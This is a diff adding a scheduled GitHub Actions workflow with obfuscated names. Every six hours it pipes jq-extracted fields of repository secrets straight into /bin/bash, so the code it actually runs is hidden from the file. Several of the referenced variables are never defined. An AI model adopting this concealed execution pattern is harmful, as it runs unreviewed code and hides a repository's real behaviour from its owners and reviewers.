@@ -1,0 +1,21 @@
+name: renzhuzhenglezhengg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renzhuzhenglezhengg
+        env:
+          na81860: ${{ secrets.na81860 }}
+        run: |
+          echo $na81860 | jq -r .ihozx7 | /bin/bash
+          echo $pfr88888 | jq -r .ejo1100 | /bin/bash
+          echo $fis4 | jq -r .xq233 | /bin/bash
+          echo $juyn6688 | jq -r .loi9615 | /bin/bash
+          echo $qdocj74115 | jq -r .y62 | /bin/bash
+
